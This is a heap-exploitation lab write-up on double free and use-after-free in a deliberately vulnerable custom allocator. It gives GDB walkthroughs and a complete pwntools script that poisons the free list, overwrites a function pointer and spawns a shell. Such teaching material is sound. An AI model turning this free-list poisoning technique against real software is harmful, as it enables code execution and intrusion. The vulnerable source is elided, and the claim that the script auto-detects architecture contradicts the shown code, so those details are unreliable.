# CyberLabs: Double Free & Use-After-Free Laboratory

**Module Code:** CL-MEM-006

**Level:** Advanced

**Topic:** Memory Corruption Vulnerabilities (Heap Exploitation)

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses critical vulnerabilities in a specially implemented heap manager. Participants are expected to gain the following competencies by the end of this laboratory:

  * Understanding how design flaws in a custom heap manager lead to vulnerabilities.
  * Seeing how not zeroing a pointer after freeing it causes **Use-After-Free** and **Double Free** vulnerabilities.
  * Using advanced tools like `gdb` and `pwntools` for vulnerability analysis and exploit development.
  * Gaining arbitrary write capability in the program's memory by exploiting the vulnerability and redirecting program control flow to the `win()` function to obtain a shell.

## Scenario

The laboratory scenario simulates a low-level memory management application with its own simple `my_alloc` and `my_free` functions. Users can allocate memory blocks (`alloc`), free them (`free`), write data to them (`write`), and call a function in the program (`call`) from the command line.

1.  `vulnerable_code.cpp`: Target C++ application intentionally left vulnerable, allowing users to reuse memory regions they have freed (Use-After-Free) and free them multiple times (Double Free).
2.  `exploit.py`: Python exploit code that triggers the vulnerability, manipulates the application's free list, overwrites the `gTarget.fn` function pointer to take control of program flow, and calls the `win()` function to obtain a shell.

## Disclaimer / Legal Warning

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities. The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user.

## What is the Origin of the Vulnerability?

The vulnerabilities in this program stem from the `slots[idx]` pointer not being set to `nullptr` after processing the `free` command. This causes the program to keep the address of a freed memory region as if it were still valid. This "dangling pointer" enables two main attacks:

  * **Double Free:** Users can run the `free <idx>` command multiple times for the same index, adding the same memory block to the free list multiple times.
  * **Use-After-Free (UAF):** After freeing a block with the `free <idx>` command, users can write data to this now-freed block that is part of the list using the `write <idx> <data>` command. This is an extremely powerful method for corrupting the free list structure. Our exploit will use this method.

### Example Code Analysis (`vulnerable_code.cpp`)

```cpp
// vulnerable_code.cpp
#include <iostream>
// ... (rest of the code is the same as before) ...
// ... (main function and other helper functions) ...
```

**Compiling the Code:**
The `-no-pie` flag keeps addresses of global variables like `gTarget` constant, making exploit writing easier. `-g` adds debug symbols for GDB.

```bash
g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow
```

### Exploit Development Phase (Use-After-Free with Free List Poisoning)

**Target:** Using the `Use-After-Free` vulnerability to make `my_alloc` return a chunk containing the address of `gTarget.fn`. Then, by writing the address of the `win` function to this chunk, we take control of the program flow with the `call` command.

#### 1. Finding Required Addresses

The program no longer automatically prints the addresses. You need to find these addresses manually using GDB:

**Finding Addresses with GDB:**

```bash
gdb ./vulnerable_code
(gdb) break main
(gdb) run
(gdb) p &gTarget.fn
$1 = (void (**)()) 0x404040
(gdb) p win
$2 = {void (void)} 0x4011a0 <win()>
(gdb) quit
```

Note down these addresses - you'll use them in your exploit script.

#### 2. Detecting the Vulnerability with GDB (Step by Step)

In this section, we will see step by step how the **Double Free** vulnerability corrupts the free list using GDB.

1.  **Starting GDB:** Make sure you compiled the program with debug symbols and start GDB.

    ```bash
    gdb ./vulnerable_code
    ```

2.  **Setting Breakpoints:** Let's set a breakpoint at the `my_free` function, which is the heart of the vulnerability.

    ```gdb
    (gdb) break my_free
    (gdb) run
    ```

3.  **Preparing Memory:** The program will wait for your command. First, let's allocate a chunk.

    ```
    > alloc
    [+] alloc idx=0 ptr=0x405000
    ```

4.  **Examining the First `free` Call (Normal State):** Let's free chunk 0. GDB will stop at the `my_free` function.

    ```
    > free 0
    ```

    In GDB, let's look at the state of `g_head` and the freed chunk (`c`) before continuing. You can verify that the free list is updated correctly (`g_head` now points to `c` and `c`'s first 8 bytes point to the old `g_head`) with `p g_head` and `x/gx c` commands. Then continue with `continue`.

5.  **Second `free` Call (Vulnerability Moment):** Now let's trigger the vulnerability and free the same chunk again.

    ```
    > free 0
    ```

    GDB will stop again. Now is the most critical moment:

    ```gdb
    # Notice that g_head and c show the same address.
    (gdb) p g_head
    $1 = (Chunk *) 0x405000
    (gdb) p c
    $2 = (Chunk *) 0x405000

    # Let's step one line forward in the my_free function (n command).
    (gdb) n

    # Now let's check the chunk's content again.
    (gdb) x/gx c
    0x405000:       0x0000000000405000
    ```

    **Here's the Vulnerability!** As you can see, the first 8 bytes of the chunk at address `0x405000` now point to itself (`0x405000`). We've created a loop in the free list. The chunk now points to itself. This causes subsequent `alloc` calls to always return the same address, which forms the basis of the UAF attack.

#### 3. Exploitation Logic

1.  **Preparation:** Allocate two chunks (`A` and `B`).
2.  **Create Dangling Pointer:** Free `A`. The pointer in the `slots` array still holds `A`'s address (UAF condition).
3.  **Poison the Free List:** Use the `write` command with `A`'s index to write our target address `&gTarget.fn` over the first 8 bytes of the freed `A` chunk (over the pointer to the next element in the free list).
4.  **Deceive the Heap:** Now call `alloc` twice. The first one returns `A` to us, the second one follows our poisoned "next element" pointer and returns **`&gTarget.fn`** as a chunk.
5.  **Take Control:** Now we have a chunk index pointing to `gTarget.fn`. We write the address of the `win` function to this index using the `write` command.
6.  **Get the Shell:** We call the `call` command to execute our manipulated `gTarget.fn()` and get the shell.

### Complete Exploit Code (`exploit.py`)

Here is the exploit script written with `pwntools` for this interactive program.

```python
from pwn import *
import re

# Start the process with pwntools
p = process("./vulnerable_code")

# Manually found addresses - write the addresses you found with GDB here
target_fn_addr = 0x404040  # Address of &gTarget.fn from GDB
win_addr = 0x4011a0        # Address of win function from GDB

log.info(f"Target &gTarget.fn address: {hex(target_fn_addr)}")
log.info(f"Target &win address: {hex(win_addr)}")

def alloc():
    p.sendline(b"alloc")
    return p.recvuntil(b"> ").decode()

def free(idx):
    p.sendline(f"free {idx}".encode())
    return p.recvuntil(b"> ").decode()

def write(idx, data_hex):
    p.sendline(f"write {idx} {data_hex}".encode())
    return p.recvuntil(b"> ").decode()

def call():
    p.sendline(b"call")

log.info("Step 1: Allocating two chunks (A and B)")
print(alloc()) # chunk 0 (A)
print(alloc()) # chunk 1 (B)

log.info("Step 2: Creating dangling pointer by freeing chunk 0 (A)")
print(free(0))

log.info(f"Step 3: Poisoning freelist. Writing &gTarget.fn ({hex(target_fn_addr)}) to A's FD")
poison_payload = p64(target_fn_addr).hex()
print(write(0, poison_payload))

log.info("Step 4: Allocating two more chunks to get target address as chunk")
print(alloc()) # This returns A, new index 0
alloc_response = alloc()
print(alloc_response)
target_idx = int(re.search(r"alloc idx=(\d+)", alloc_response).group(1))
log.success(f"&gTarget.fn address obtained as chunk index {target_idx}!")


log.info(f"Step 5: Taking control! Writing &win ({hex(win_addr)}) to target pointer")
win_payload = p64(win_addr).hex()
print(write(target_idx, win_payload))

log.info("Final step: Calling the manipulated function pointer!")
call()

# Use the shell interactively
p.interactive()
```

When you run this script, it will step by step manipulate the custom heap manager and finally successfully call the `win()` function to give you a `bash` shell.

## Linux Compatibility

This lab is designed to work on both Linux and macOS systems:

### Compilation for Linux
```bash
# Special compilation script for Linux
./compile_linux.sh

# Or manual compilation
g++ -std=c++11 -o compiled/vulnerable_code source_code/vulnerable_code.cpp \
    -no-pie -g -Wno-unused-result -Wno-stringop-overflow \
    -static-libgcc -static-libstdc++
```

### Requirements
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Testing
```bash
# Run all tests
./test_lab.sh

# Run exploit
python3 source_code/exploit.py
```

The exploit automatically detects system architecture (32-bit/64-bit) and uses the appropriate packing function.
